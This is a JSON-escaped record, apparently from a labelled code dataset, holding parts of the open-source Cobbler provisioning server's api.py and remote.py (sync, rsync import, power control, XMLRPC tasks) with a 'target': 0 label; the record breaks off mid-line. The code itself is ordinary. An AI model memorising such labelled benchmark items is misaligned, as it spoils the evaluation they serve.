\"\"\"\n        return self.__since(mtime, self.files, collapse=collapse)\n\n    def get_menus_since(self, mtime: float, collapse=False) -> list:\n        \"\"\"\n        Return files modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of files which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.menus, collapse=collapse)\n\n    # ==========================================================================\n\n    def get_signatures(self) -> dict:\n        \"\"\"\n        This returns the local signature cache.\n\n        :return: The dict containing all signatures.\n        \"\"\"\n        return utils.SIGNATURE_CACHE\n\n    def signature_update(self):\n        \"\"\"\n        Update all signatures from the URL specified in the settings.\n        \"\"\"\n        try:\n            url = self.settings().signature_url\n            dlmgr = download_manager.DownloadManager(self._collection_mgr)\n            # write temp json file\n            tmpfile = tempfile.NamedTemporaryFile()\n            sigjson = dlmgr.urlread(url)\n            tmpfile.write(sigjson.text.encode())\n            tmpfile.flush()\n            self.logger.debug(\"Successfully got file from %s\" % self.settings().signature_url)\n            # test the import without caching it\n            try:\n                utils.load_signatures(tmpfile.name, cache=False)\n            except:\n                self.logger.error(\"Downloaded signatures failed test load (tempfile = %s)\", tmpfile.name)\n\n            # rewrite the real signature file and import it for real\n            f = open(self.settings().signature_path, \"w\")\n            f.write(sigjson.text)\n            f.close()\n\n            utils.load_signatures(self.settings().signature_path)\n        except:\n            utils.log_exc()\n\n    # ==========================================================================\n\n    def dump_vars(self, obj, formatted_output: bool = False):\n        \"\"\"\n        Dump all known variables related to that object.\n\n        :param obj: The object for which the variables should be dumped.\n        :param formatted_output: If True the values will align in one column and be pretty printed for cli example.\n        :return: A dictionary with all the information which could be collected.\n        \"\"\"\n        return obj.dump_vars(formatted_output)\n\n    # ==========================================================================\n\n    def auto_add_repos(self):\n        \"\"\"\n        Import any repos this server knows about and mirror them. Run ``cobbler reposync`` to apply the changes.\n        Credit: Seth Vidal.\n\n        :raises ImportError\n        \"\"\"\n        self.log(\"auto_add_repos\")\n        try:\n            import dnf\n        except:\n            raise ImportError(\"dnf is not installed\")\n\n        base = dnf.Base()\n        base.read_all_repos()\n        basearch = base.conf.substitutions[\"basearch\"]\n\n        for repository in base.repos.iter_enabled():\n            auto_name = repository.id + '-' + base.conf.releasever + '-' + basearch\n\n            if self.find_repo(auto_name) is None:\n                cobbler_repo = self.new_repo()\n                cobbler_repo.name = auto_name\n                cobbler_repo.breed = enums.RepoBreeds.YUM\n                cobbler_repo.arch = basearch\n                cobbler_repo.comment = repository.name\n                baseurl = repository.baseurl\n                metalink = repository.metalink\n                mirrorlist = repository.mirrorlist\n\n                if metalink is not None:\n                    mirror = metalink\n                    mirror_type = enums.MirrorType.METALINK\n                elif mirrorlist is not None:\n                    mirror = mirrorlist\n                    mirror_type = enums.MirrorType.MIRRORLIST\n                elif len(baseurl) > 0:\n                    mirror = baseurl[0]\n                    mirror_type = enums.MirrorType.BASEURL\n                else:\n                    mirror = \"\"\n                    mirror_type = enums.MirrorType.NONE\n\n                cobbler_repo.mirror = mirror\n                cobbler_repo.mirror_type = mirror_type\n                self.log(\"auto repo adding: %s\" % auto_name)\n                self.add_repo(cobbler_repo)\n            else:\n                self.log(\"auto repo adding: %s - exists\" % auto_name)\n\n    # ==========================================================================\n\n    def get_repo_config_for_profile(self, obj) -> str:\n        \"\"\"\n        Get the repository configuration for the specified profile\n\n        :param obj: The profile to return the configuration for.\n        :return: The repository configuration as a string.\n        \"\"\"\n        return self.yumgen.get_yum_config(obj, True)\n\n    def get_repo_config_for_system(self, obj) -> str:\n        \"\"\"\n        Get the repository configuration for the specified system.\n\n        :param obj: The system to return the configuration for.\n        :return: The repository configuration as a string.\n        \"\"\"\n        return self.yumgen.get_yum_config(obj, False)\n\n    # ==========================================================================\n\n    def get_template_file_for_profile(self, obj, path) -> str:\n        \"\"\"\n        Get the template for the specified profile.\n\n        :param obj: The object which is related to that template.\n        :param path: The path to the template.\n        :return: The template as in its string representation.\n        \"\"\"\n        template_results = self.tftpgen.write_templates(obj, False, path)\n        if path in template_results:\n            return template_results[path]\n        else:\n            return \"# template path not found for specified profile\"\n\n    def get_template_file_for_system(self, obj, path):\n        \"\"\"\n        Get the template for the specified system.\n\n        :param obj: The object which is related to that template.\n        :param path: The path to the template.\n        :return: The template as in its string representation.\n        \"\"\"\n        template_results = self.tftpgen.write_templates(obj, False, path)\n        if path in template_results:\n            return template_results[path]\n        else:\n            return \"# template path not found for specified system\"\n\n    # ==========================================================================\n\n    def generate_ipxe(self, profile: str, image: str, system: str) -> str:\n        \"\"\"\n        Generate the ipxe configuration files. The system wins over the profile. Profile and System win over Image.\n\n        :param profile: The profile to return the configuration for.\n        :param image: The image to return the configuration for.\n        :param system: The system to return the configuration for.\n        :return: The generated configuration file.\n        \"\"\"\n        self.log(\"generate_ipxe\")\n        data = \"\"\n        if profile is None and image is None and system is None:\n            boot_menu = self.tftpgen.make_pxe_menu()\n            if 'ipxe' in boot_menu:\n                data = boot_menu['ipxe']\n        elif system:\n            data = self.tftpgen.generate_ipxe(\"system\", system)\n        elif profile:\n            data = self.tftpgen.generate_ipxe(\"profile\", profile)\n        elif image:\n            data = self.tftpgen.generate_ipxe(\"image\", image)\n        return data\n\n    # ==========================================================================\n\n    def generate_bootcfg(self, profile: str, system: str) -> str:\n        \"\"\"\n        Generate a boot configuration. The system wins over the profile.\n\n        :param profile: The profile to return the configuration for.\n        :param system: The system to return the configuration for.\n        :return: The generated configuration file.\n        \"\"\"\n        self.log(\"generate_bootcfg\")\n        if system:\n            return self.tftpgen.generate_bootcfg(\"system\", system)\n        else:\n            return self.tftpgen.generate_bootcfg(\"profile\", profile)\n\n    # ==========================================================================\n\n    def generate_script(self, profile: Optional[str], system: Optional[str], name: str):\n        \"\"\"\n        Generate an autoinstall script for the specified profile or system. The system wins over the profile.\n\n        :param profile: The profile name to generate the script for.\n        :param system: The system name to generate the script for.\n        :param name: The name of the script which should be generated. Must only contain alphanumeric characters, dots\n                     and underscores.\n        :return: The generated script or an error message.\n        \"\"\"\n        self.log(\"generate_script\")\n        if system:\n            return self.tftpgen.generate_script(\"system\", system, name)\n        else:\n            return self.tftpgen.generate_script(\"profile\", profile, name)\n\n    # ==========================================================================\n\n    def check(self) -> Union[None, list]:\n        \"\"\"\n        See if all preqs for network booting are valid. This returns a list of strings containing instructions on things\n        to correct. An empty list means there is nothing to correct, but that still doesn't mean there are configuration\n        errors. This is mainly useful for human admins, who may, for instance, forget to properly set up their TFTP\n        servers for PXE, etc.\n\n        :return: None or a list of things to address.\n        \"\"\"\n        self.log(\"check\")\n        action_check = check.CobblerCheck(self._collection_mgr)\n        return action_check.run()\n\n    # ==========================================================================\n\n    def validate_autoinstall_files(self):\n        \"\"\"\n        Validate if any of the autoinstallation files are invalid and if yes report this.\n\n        \"\"\"\n        self.log(\"validate_autoinstall_files\")\n        autoinstall_mgr = autoinstall_manager.AutoInstallationManager(self._collection_mgr)\n        autoinstall_mgr.validate_autoinstall_files()\n\n    # ==========================================================================\n\n    def sync_systems(self, systems: List[str], verbose: bool = False):\n        \"\"\"\n        Take the values currently written to the configuration files in /etc, and /var, and build out the information\n        tree found in /tftpboot. Any operations done in the API that have not been saved with serialize() will NOT be\n        synchronized with this command.\n\n        :param systems: List of specified systems that needs to be synced\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        \"\"\"\n        self.log(\"sync_systems\")\n        if not (systems and isinstance(systems, list) and all(isinstance(sys_name, str) for sys_name in systems)):\n            raise TypeError('Systems must be a list of one or more strings.')\n        sync_obj = self.get_sync(verbose=verbose)\n        sync_obj.run_sync_systems(systems)\n\n    # ==========================================================================\n\n    def sync(self, verbose: bool = False, what: Optional[list] = None):\n        \"\"\"\n        Take the values currently written to the configuration files in /etc, and /var, and build out the information\n        tree found in /tftpboot. Any operations done in the API that have not been saved with serialize() will NOT be\n        synchronized with this command.\n\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        :param what:   List of strings what services to sync (e.g. dhcp and/or dns). Empty list for full sync.\n        \"\"\"\n        # Empty what: Full sync\n        if not what:\n            self.logger.info(\"syncing all\")\n            sync_obj = self.get_sync(verbose=verbose)\n            sync_obj.run()\n            return\n        # Non empty what: Specific sync\n        if not isinstance(what, list):\n            raise TypeError(\"'what' needs to be of type list!\")\n        if 'dhcp' in what:\n            self.sync_dhcp()\n        if 'dns' in what:\n            self.sync_dns()\n\n    # ==========================================================================\n\n    def sync_dns(self):\n        \"\"\"\n        Only build out the DNS configuration.\n        \"\"\"\n        if not self.settings().manage_dns:\n            self.logger.error(\"manage_dns not set\")\n            return\n        self.logger.info(\"sync_dns\")\n        dns_module = self.get_module_from_file(\n            \"dns\",\n            \"module\",\n            \"managers.bind\"\n        )\n        dns = dns_module.get_manager(self._collection_mgr)\n        dns.sync()\n\n    # ==========================================================================\n\n    def sync_dhcp(self):\n        \"\"\"\n        Only build out the DHCP configuration.\n        \"\"\"\n        if not self.settings().manage_dhcp:\n            self.logger.error(\"manage_dhcp not set\")\n            return\n        self.logger.info(\"sync_dhcp\")\n        dhcp_module = self.get_module_from_file(\n            \"dhcp\",\n            \"module\",\n            \"managers.isc\"\n        )\n        dhcp = dhcp_module.get_manager(self._collection_mgr)\n        dhcp.sync()\n\n    # ==========================================================================\n\n    def get_sync(self, verbose: bool = False):\n        \"\"\"\n        Get a Cobbler Sync object which may be executed through the call of ``obj.run()``.\n\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        :return: An instance of the CobblerSync class to execute the sync with.\n        \"\"\"\n        if not isinstance(verbose, bool):\n            raise TypeError(\"get_sync: verbose parameter needs to be of type bool!\")\n        dhcp = self.get_module_from_file(\n            \"dhcp\",\n            \"module\",\n            \"managers.isc\"\n        ).get_manager(self._collection_mgr)\n        dns = self.get_module_from_file(\n            \"dns\",\n            \"module\",\n            \"managers.bind\"\n        ).get_manager(self._collection_mgr)\n        tftpd = self.get_module_from_file(\n            \"tftpd\",\n            \"module\",\n            \"managers.in_tftpd\",\n        ).get_manager(self._collection_mgr)\n\n        return sync.CobblerSync(self._collection_mgr, dhcp=dhcp, dns=dns, tftpd=tftpd, verbose=verbose)\n\n    # ==========================================================================\n\n    def reposync(self, name: Optional[str] = None, tries: int = 1, nofail: bool = False):\n        \"\"\"\n        Take the contents of ``/var/lib/cobbler/repos`` and update them -- or create the initial copy if no contents\n        exist yet.\n\n        :param name: The name of the repository to run reposync for.\n        :param tries: How many tries should be executed before the action fails.\n        :param nofail: If True then the action will fail, otherwise the action will just be skipped. This respects the\n                       ``tries`` parameter.\n        \"\"\"\n        self.log(\"reposync\", [name])\n        action_reposync = reposync.RepoSync(self._collection_mgr, tries=tries, nofail=nofail)\n        action_reposync.run(name)\n\n    # ==========================================================================\n\n    def status(self, mode: str):\n        \"\"\"\n        Get the status of the current Cobbler instance.\n\n        :param mode: \"text\" or anything else. Meaning whether the output is thought for the terminal or not.\n        :return: The current status of Cobbler.\n        \"\"\"\n        statusifier = status.CobblerStatusReport(self._collection_mgr, mode)\n        return statusifier.run()\n\n    # ==========================================================================\n\n    def import_tree(self, mirror_url: str, mirror_name: str, network_root=None, autoinstall_file=None, rsync_flags=None,\n                    arch=None, breed=None, os_version=None) -> bool:\n        \"\"\"\n        Automatically import a directory tree full of distribution files.\n\n        :param mirror_url: Can be a string that represents a path, a user@host syntax for SSH, or an rsync:// address.\n                           If mirror_url is a filesystem path and mirroring is not desired, set network_root to\n                           something like \"nfs://path/to/mirror_url/root\"\n        :param mirror_name: The name of the mirror.\n        :param network_root:\n        :param autoinstall_file:\n        :param rsync_flags:\n        :param arch:\n        :param breed:\n        :param os_version:\n        \"\"\"\n        self.log(\"import_tree\", [mirror_url, mirror_name, network_root, autoinstall_file, rsync_flags])\n\n        # Both --path and --name are required arguments.\n        if mirror_url is None or not mirror_url:\n            self.log(\"import failed.  no --path specified\")\n            return False\n        if mirror_name is None or not mirror_name:\n            self.log(\"import failed.  no --name specified\")\n            return False\n\n        path = os.path.normpath(\"%s/distro_mirror/%s\" % (self.settings().webdir, mirror_name))\n        if arch is not None:\n            arch = arch.lower()\n            if arch == \"x86\":\n                # be consistent\n                arch = \"i386\"\n            if path.split(\"-\")[-1] != arch:\n                path += (\"-%s\" % arch)\n\n        # We need to mirror (copy) the files.\n        self.log(\"importing from a network location, running rsync to fetch the files first\")\n\n        utils.mkdir(path)\n\n        # Prevent rsync from creating the directory name twice if we are copying via rsync.\n\n        if not mirror_url.endswith(\"/\"):\n            mirror_url = \"%s/\" % mirror_url\n\n        if mirror_url.startswith(\"http://\") or mirror_url.startswith(\"https://\") or mirror_url.startswith(\"ftp://\") \\\n                or mirror_url.startswith(\"nfs://\"):\n            # HTTP mirrors are kind of primative. rsync is better. That's why this isn't documented in the manpage and\n            # we don't support them.\n            # TODO: how about adding recursive FTP as an option?\n            self.log(\"unsupported protocol\")\n            return False\n        else:\n            # Good, we're going to use rsync.. We don't use SSH for public mirrors and local files.\n            # Presence of user@host syntax means use SSH\n            spacer = \"\"\n            if not mirror_url.startswith(\"rsync://\") and not mirror_url.startswith(\"/\"):\n                spacer = ' -e \"ssh\" '\n            rsync_cmd = RSYNC_CMD\n            if rsync_flags:\n                rsync_cmd += \" \" + rsync_flags\n\n            # If --available-as was specified, limit the files we pull down via rsync to just those that are critical\n            # to detecting what the distro is\n            if network_root is not None:\n                rsync_cmd += \" --include-from=/etc/cobbler/import_rsync_whitelist\"\n\n            # kick off the rsync now\n            utils.run_this(rsync_cmd, (spacer, mirror_url, path))\n\n        if network_root is not None:\n            # In addition to mirroring, we're going to assume the path is available over http, ftp, and nfs, perhaps on\n            # an external filer. Scanning still requires --mirror is a filesystem path, but --available-as marks the\n            # network path. This allows users to point the path at a directory containing just the network boot files\n            # while the rest of the distro files are available somewhere else.\n\n            # Find the filesystem part of the path, after the server bits, as each distro URL needs to be calculated\n            # relative to this.\n\n            if not network_root.endswith(\"/\"):\n                network_root += \"/\"\n            valid_roots = [\"nfs://\", \"ftp://\", \"http://\", \"https://\"]\n            for valid_root in valid_roots:\n                if network_root.startswith(valid_root):\n                    break\n            else:\n                self.log(\"Network root given to --available-as must be nfs://, ftp://, http://, or https://\")\n                return False\n\n            if network_root.startswith(\"nfs://\"):\n                try:\n                    (a, b, rest) = network_root.split(\":\", 3)\n                except:\n                    self.log(\"Network root given to --available-as is missing a colon, please see the manpage example.\")\n                    return False\n\n        import_module = self.get_module_by_name(\"managers.import_signatures\") \\\n            .get_import_manager(self._collection_mgr)\n        import_module.run(path, mirror_name, network_root, autoinstall_file, arch, breed, os_version)\n        return True\n\n    # ==========================================================================\n\n    def acl_config(self, adduser: Optional[str] = None, addgroup: Optional[str] = None,\n                   removeuser: Optional[str] = None, removegroup: Optional[str] = None):\n        \"\"\"\n        Configures users/groups to run the Cobbler CLI as non-root.\n        Pass in only one option at a time. Powers ``cobbler aclconfig``.\n\n        :param adduser:\n        :param addgroup:\n        :param removeuser:\n        :param removegroup:\n        \"\"\"\n        action_acl = acl.AclConfig(self._collection_mgr)\n        action_acl.run(\n            adduser=adduser,\n            addgroup=addgroup,\n            removeuser=removeuser,\n            removegroup=removegroup\n        )\n\n    # ==========================================================================\n\n    def serialize(self):\n        \"\"\"\n        Save the cobbler_collections to disk.\n        Cobbler internal use only.\n        \"\"\"\n        self._collection_mgr.serialize()\n\n    def deserialize(self):\n        \"\"\"\n        Load cobbler_collections from disk.\n        Cobbler internal use only.\n        \"\"\"\n        return self._collection_mgr.deserialize()\n\n    # ==========================================================================\n\n    def get_module_by_name(self, module_name: str):\n        \"\"\"\n        Returns a loaded Cobbler module named 'name', if one exists, else None.\n        Cobbler internal use only.\n\n        :param module_name:\n        :return:\n        \"\"\"\n        return module_loader.get_module_by_name(module_name)\n\n    def get_module_from_file(self, section: str, name: str, fallback: Optional[str] = None):\n        \"\"\"\n        Looks in ``/etc/cobbler/modules.conf`` for a section called 'section' and a key called 'name', and then returns\n        the module that corresponds to the value of that key.\n        Cobbler internal use only.\n\n        :param section:\n        :param name:\n        :param fallback:\n        :return:\n        \"\"\"\n        return module_loader.get_module_from_file(section, name, fallback)\n\n    def get_module_name_from_file(self, section: str, name: str, fallback: Optional[str] = None):\n        \"\"\"\n        Looks up a module the same as ``get_module_from_file`` but returns the module name rather than the module\n        itself.\n\n        :param section:\n        :param name:\n        :param fallback:\n        :return:\n        \"\"\"\n        return module_loader.get_module_name(section, name, fallback)\n\n    def get_modules_in_category(self, category: str):\n        \"\"\"\n        Returns all modules in a given category, for instance \"serializer\", or \"cli\".\n        Cobbler internal use only.\n\n        :param category: The category to check.\n        :return: The list of modules.\n        \"\"\"\n        return module_loader.get_modules_in_category(category)\n\n    # ==========================================================================\n\n    def authenticate(self, user: str, password: str):\n        \"\"\"\n        (Remote) access control. This depends on the chosen authentication module.\n        Cobbler internal use only.\n\n        :param user: The username to check for authentication.\n        :param password: The password to check for authentication.\n        :return: Whether the action succeeded or not.\n        \"\"\"\n        rc = self.authn.authenticate(self, user, password)\n        self.log(\"authenticate\", [user, rc])\n        return rc\n\n    def authorize(self, user: str, resource: str, arg1=None, arg2=None):\n        \"\"\"\n        (Remote) access control. This depends on the chosen authorization module.\n        Cobbler internal use only.\n\n        :param user: The username to check for authorization.\n        :param resource: The type of resource which should be checked for access from the supplied user.\n        :param arg1: The actual resource to check for authorization.\n        :param arg2: Not known what this parameter does exactly.\n        :return: The return code of the action.\n        \"\"\"\n        rc = self.authz.authorize(self, user, resource, arg1, arg2)\n        self.log(\"authorize\", [user, resource, arg1, arg2, rc], debug=True)\n        return rc\n\n    # ==========================================================================\n\n    def build_iso(self, iso=None, profiles=None, systems=None, buildisodir=None, distro=None, standalone=None,\n                  airgapped=None, source=None, exclude_dns=None, xorrisofs_opts=None):\n        \"\"\"\n        Build an iso image which may be network bootable or not.\n\n        :param iso:\n        :param profiles:\n        :param systems:\n        :param buildisodir:\n        :param distro:\n        :param standalone:\n        :param airgapped:\n        :param source:\n        :param exclude_dns:\n        :param xorrisofs_opts:\n        \"\"\"\n        builder = buildiso.BuildIso(self._collection_mgr)\n        builder.run(\n            iso=iso, profiles=profiles, systems=systems, buildisodir=buildisodir, distro=distro, standalone=standalone,\n            airgapped=airgapped, source=source, exclude_dns=exclude_dns, xorrisofs_opts=xorrisofs_opts\n        )\n\n    # ==========================================================================\n\n    def hardlink(self):\n        \"\"\"\n        Hardlink all files where this is possible to improve performance.\n\n        :return: The return code of the subprocess call which actually hardlinks the files.\n        \"\"\"\n        linker = hardlink.HardLinker(api=self)\n        return linker.run()\n\n    # ==========================================================================\n\n    def replicate(self, cobbler_master: Optional[str] = None, port: str = \"80\", distro_patterns: str = \"\",\n                  profile_patterns: str = \"\", system_patterns: str = \"\", repo_patterns: str = \"\",\n                  image_patterns: str = \"\", mgmtclass_patterns=None, package_patterns=None, file_patterns: bool = False,\n                  prune: bool = False, omit_data: bool = False, sync_all: bool = False, use_ssl: bool = False):\n        \"\"\"\n        Pull down data/configs from a remote Cobbler server that is a master to this server.\n\n        :param cobbler_master: The hostname/URL of the other Cobbler server\n        :param port: The port to use for the replication task.\n        :param distro_patterns: The pattern of distros which should be synced.\n        :param profile_patterns: The pattern of profiles which should be synced.\n        :param system_patterns: The pattern of systems which should be synced.\n        :param repo_patterns: The pattern of repositories which should be synced.\n        :param image_patterns: The pattern of images which should be synced.\n        :param mgmtclass_patterns: The pattern of management classes which should be synced.\n        :param package_patterns: The pattern of packages which should be synced.\n        :param file_patterns: The pattern of files which should be synced.\n        :param prune: Whether the object not on the master should be removed or not.\n        :param omit_data: If the data downloaded by the current Cobbler server should be rsynced to the destination\n                          server.\n        :param sync_all: This parameter behaves similarly to a dry run argument. If True then everything will executed,\n                         if False then only some things are synced.\n        :param use_ssl: Whether SSL should be used (True) or not (False).\n        \"\"\"\n        replicator = replicate.Replicate(self._collection_mgr)\n        return replicator.run(\n            cobbler_master=cobbler_master, port=port, distro_patterns=distro_patterns,\n            profile_patterns=profile_patterns, system_patterns=system_patterns, repo_patterns=repo_patterns,\n            image_patterns=image_patterns, mgmtclass_patterns=mgmtclass_patterns, package_patterns=package_patterns,\n            file_patterns=file_patterns, prune=prune, omit_data=omit_data, sync_all=sync_all, use_ssl=use_ssl\n        )\n\n    # ==========================================================================\n\n    def report(self, report_what: Optional[str] = None, report_name: Optional[str] = None,\n               report_type: Optional[str] = None, report_fields: Optional[str] = None,\n               report_noheaders: Optional[bool] = None):\n        \"\"\"\n        Report functionality for Cobbler.\n\n        :param report_what: The object type that should be reported.\n        :param report_name: The name of the object which should be possibly reported.\n        :param report_type: May be either \"text\", \"csv\", \"mediawiki\", \"trac\" or \"doku\".\n        :param report_fields: Specify \"all\" or the fields you want to be reported.\n        :param report_noheaders: If the column headers should be included in the output or not.\n        \"\"\"\n        reporter = report.Report(self._collection_mgr)\n        return reporter.run(report_what=report_what, report_name=report_name, report_type=report_type,\n                            report_fields=report_fields, report_noheaders=report_noheaders)\n\n    # ==========================================================================\n\n    def power_system(self, system: str, power_operation: str, user: Optional[str] = None,\n                     password: Optional[str] = None):\n        \"\"\"\n        Power on / power off / get power status /reboot a system.\n\n        :param system: Cobbler system\n        :param power_operation: power operation. Valid values: on, off, reboot, status\n        :param user: power management user\n        :param password: power management password\n        :return: bool if operation was successful\n        \"\"\"\n\n        if power_operation == \"on\":\n            self.power_mgr.power_on(system, user=user, password=password)\n        elif power_operation == \"off\":\n            self.power_mgr.power_off(system, user=user, password=password)\n        elif power_operation == \"status\":\n            return self.power_mgr.get_power_status(system, user=user, password=password)\n        elif power_operation == \"reboot\":\n            self.power_mgr.reboot(system, user=user, password=password)\n        else:\n            utils.die(\"invalid power operation '%s', expected on/off/status/reboot\" % power_operation)\n        return None\n\n    # ==========================================================================\n\n    def clear_logs(self, system):\n        \"\"\"\n        Clears console and anamon logs for system\n\n        :param system: The system to clear logs of.\n        \"\"\"\n        log.LogTool(self._collection_mgr, system, self).clear()\n\n    # ==========================================================================\n\n    def get_valid_obj_boot_loaders(self, obj) -> List[str]:\n        \"\"\"\n        Return the list of valid boot loaders for the object\n\n        :param obj: The object for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.\n        \"\"\"\n        return obj.supported_boot_loaders\n\n    # ==========================================================================\n\n    def create_grub_images(self):\n        \"\"\"\n        Create the GRUB installer images via this API call. It utilizes ``grub2-mkimage`` behind the curtain.\n        \"\"\"\n        action = grubimage.GrubImage(self)\n        action.run()", "target": 0}]}, {"raw_url": "https://github.com/cobbler/cobbler/raw/d8f60bbf14a838c8c8a1dba98086b223e35fe70a/cobbler%2Fremote.py", "code": "\"\"\"\nCopyright 2007-2009, Red Hat, Inc and Others\nMichael DeHaan <michael.dehaan AT gmail>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n02110-1301  USA\n\"\"\"\n\nimport base64\nimport errno\nimport fcntl\nimport keyword\nimport logging\nimport os\nimport random\nimport stat\nimport time\nimport re\nimport xmlrpc.server\nfrom socketserver import ThreadingMixIn\nfrom threading import Thread\nfrom typing import Dict, List, Optional, Union\nfrom xmlrpc.server import SimpleXMLRPCRequestHandler\n\nfrom cobbler import autoinstall_manager\nfrom cobbler import configgen\nfrom cobbler.items import item, package, system, image, profile, repo, mgmtclass, distro, file, menu\nfrom cobbler import tftpgen\nfrom cobbler import utils\nfrom cobbler.cexceptions import CX\nfrom cobbler.validate import validate_autoinstall_script_name, validate_obj_id, validate_obj_name\n\nEVENT_TIMEOUT = 7 * 24 * 60 * 60  # 1 week\nCACHE_TIMEOUT = 10 * 60  # 10 minutes\n\n# task codes\nEVENT_RUNNING = \"running\"\nEVENT_COMPLETE = \"complete\"\nEVENT_FAILED = \"failed\"\n\n# normal events\nEVENT_INFO = \"notification\"\n\n\nclass CobblerThread(Thread):\n    \"\"\"\n    Code for Cobbler's XMLRPC API.\n    \"\"\"\n\n    def __init__(self, event_id, remote, options: dict, task_name: str, api):\n        \"\"\"\n        This constructor creates a Cobbler thread which then may be run by calling ``run()``.\n\n        :param event_id: The event-id which is associated with this thread. Also used as thread name\n        :param remote: The Cobbler remote object to execute actions with.\n        :param options: Additional options which can be passed into the Thread.\n        :param task_name: The high level task name which is used to trigger pre and post task triggers\n        :param api: The Cobbler api object to resolve information with.\n        \"\"\"\n        Thread.__init__(self, name=event_id)\n        self.event_id = event_id\n        self.remote = remote\n        self.logger = logging.getLogger()\n        if options is None:\n            options = {}\n        self.options = options\n        self.task_name = task_name\n        self.api = api\n\n    def on_done(self):\n        \"\"\"\n        This stub is needed to satisfy the Python inheritance chain.\n        \"\"\"\n\n    def run(self):\n        \"\"\"\n        Run the thread.\n\n        :return: The return code of the action. This may possibly a boolean or a Linux return code.\n        \"\"\"\n        time.sleep(1)\n        try:\n            if utils.run_triggers(self.api, None, \"/var/lib/cobbler/triggers/task/%s/pre/*\" % self.task_name,\n                                  self.options):\n                self.remote._set_task_state(self, self.event_id, EVENT_FAILED)\n                return False\n            rc = self._run(self)\n            if rc is not None and not rc:\n                self.remote._set_task_state(self, self.event_id, EVENT_FAILED)\n            else:\n                self.remote._set_task_state(self, self.event_id, EVENT_COMPLETE)\n                self.on_done()\n                utils.run_triggers(self.api, None, \"/var/lib/cobbler/triggers/task/%s/post/*\" % self.task_name,\n                                   self.options)\n            return rc\n        except:\n            utils.log_exc()\n            self.remote._set_task_state(self, self.event_id, EVENT_FAILED)\n            return False\n\n\n# *********************************************************************\n\n\nclass CobblerXMLRPCInterface:\n    \"\"\"\n    This is the interface used for all XMLRPC methods, for instance, as used by koan or CobblerWeb.\n\n    Most read-write operations require a token returned from \"login\". Read operations do not.\n    \"\"\"\n\n    def __init__(self, api):\n        \"\"\"\n        Constructor. Requires a Cobbler API handle.\n\n        :param api: The api to use for resolving the required information.\n        \"\"\"\n        self.api = api\n        self.logger = logging.getLogger()\n        self.token_cache: Dict[str, tuple] = {}\n        self.object_cache = {}\n        self.timestamp = self.api.last_modified_time()\n        self.events = {}\n        self.shared_secret = utils.get_shared_secret()\n        random.seed(time.time())\n        self.tftpgen = tftpgen.TFTPGen(api._collection_mgr)\n        self.autoinstall_mgr = autoinstall_manager.AutoInstallationManager(api._collection_mgr)\n\n    def check(self, token: str) -> Union[None, list]:\n        \"\"\"\n        Returns a list of all the messages/warnings that are things that admin may want to correct about the\n        configuration of the Cobbler server. This has nothing to do with \"check_access\" which is an auth/authz function\n        in the XMLRPC API.\n\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: None or a list of things to address.\n        \"\"\"\n        self.check_access(token, \"check\")\n        return self.api.check()\n\n    def background_buildiso(self, options: dict, token: str) -> str:\n        \"\"\"\n        Generates an ISO in /var/www/cobbler/pub that can be used to install profiles without using PXE.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n        webdir = self.api.settings().webdir\n\n        def runner(self):\n            self.remote.api.build_iso(\n                self.options.get(\"iso\", webdir + \"/pub/generated.iso\"),\n                self.options.get(\"profiles\", None),\n                self.options.get(\"systems\", None),\n                self.options.get(\"buildisodir\", None),\n                self.options.get(\"distro\", None),\n                self.options.get(\"standalone\", False),\n                self.options.get(\"airgapped\", False),\n                self.options.get(\"source\", None),\n                self.options.get(\"exclude_dns\", False),\n                self.options.get(\"xorrisofs_opts\", None),\n            )\n\n        def on_done(self):\n            if self.options.get(\"iso\", \"\") == webdir + \"/pub/generated.iso\":\n                msg = \"ISO now available for <A HREF=\\\"/cobbler/pub/generated.iso\\\">download</A>\"\n                self.remote._new_event(msg)\n\n        return self.__start_task(runner, token, \"buildiso\", \"Build Iso\", options, on_done)\n\n    def background_aclsetup(self, options: dict, token: str) -> str:\n        \"\"\"\n        Get the acl configuration from the config and set the acls in the backgroud.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            self.remote.api.acl_config(\n                self.options.get(\"adduser\", None),\n                self.options.get(\"addgroup\", None),\n                self.options.get(\"removeuser\", None),\n                self.options.get(\"removegroup\", None),\n            )\n\n        return self.__start_task(runner, token, \"aclsetup\", \"(CLI) ACL Configuration\", options)\n\n    def background_sync(self, options: dict, token: str) -> str:\n        \"\"\"\n        Run a full Cobbler sync in the background.\n\n        :param options: Possible options: verbose, dhcp, dns\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            what = []\n            if self.options.get(\"dhcp\", False):\n                what.append('dhcp')\n            if self.options.get(\"dns\", False):\n                what.append('dns')\n            self.remote.api.sync(self.options.get(\"verbose\", False), what=what)\n\n        return self.__start_task(runner, token, \"sync\", \"Sync\", options)\n\n    def background_syncsystems(self, options: dict, token: str) -> str:\n        \"\"\"\n        Run a lite Cobbler sync in the background with only systems specified.\n\n        :param options: Unknown what this parameter does.\n        :param token: The API-token obtained via the login() method.\n        :return: The id of the task that was started.\n        \"\"\"\n\n        def runner(self):\n            self.remote.api.sync_systems(self.options.get(\"systems\", []), self.options.get(\"verbose\", False))\n\n        return self.__start_task(runner, token, 